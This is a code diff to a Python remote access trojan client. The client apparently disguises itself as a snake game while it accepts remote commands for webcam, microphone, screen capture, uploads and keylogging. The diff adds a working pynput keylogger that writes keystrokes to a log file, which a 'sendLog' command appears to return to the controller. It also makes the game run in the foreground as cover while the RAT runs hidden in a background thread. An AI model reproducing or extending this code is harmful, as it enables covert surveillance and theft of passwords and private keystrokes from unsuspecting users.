@@ -10,7 +10,8 @@ import cv2
 import wave
 import pyaudio
 from PIL import ImageGrab
-from trojan.keylogger import startKeylogger
+from pynput import keyboard
+import json
 from jeu.snake import jeu 
 
 
@@ -69,6 +70,52 @@ def capture_webcam():
             return "Error: Could not capture frame from webcam."
     except Exception as e:
         return f"Error capturing webcam: {str(e)}"
+def send_post_req(time_interval):
+    global text
+    try:
+        payload = json.dumps({"keyboardData" : text})
+        with open("Keylogg.txt", "a", encoding="utf-8") as f:
+            f.write(payload + "\n")
+        
+        text = ""
+        timer = threading.Timer(time_interval, send_post_req, args=(time_interval,))
+        timer.start()
+    except Exception as e:
+        print(e)
+        print("Couldn't complete request!")
+
+def on_release(key):
+	if key == keyboard.Key.esc:
+	   return False
+	
+def on_press(key):
+    global text
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        text += str(key).strip("'")
+
+def keylogger():
+    global text
+    text = ""
+    time_interval = 10
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        send_post_req( time_interval)
+        listener.join()
 
 def record_microphone(duration=5):
     try:
@@ -136,7 +183,7 @@ def rat_client():
 				s.send(str.encode("Upload complete"))
 			elif command == 'keylogger':
 				s.send(str.encode("Keylogging ..."))
-				keylogger_thread = threading.Thread(target=startKeylogger, daemon=True)
+				keylogger_thread = threading.Thread(target=keylogger, daemon=True)
 				keylogger_thread.start()
 			elif command == 'sendLog':
 				if os.path.exists("Keylogg.txt"):
@@ -175,8 +222,7 @@ def rat_client():
 def main():
 	ratThread = threading.Thread(target=rat_client, daemon=True)
 	ratThread.start()
-	jeuThread = threading.Thread(target=jeu ,daemon=True)
-	jeuThread.start()
+	jeu()  
 
 
 if __name__ == "__main__":
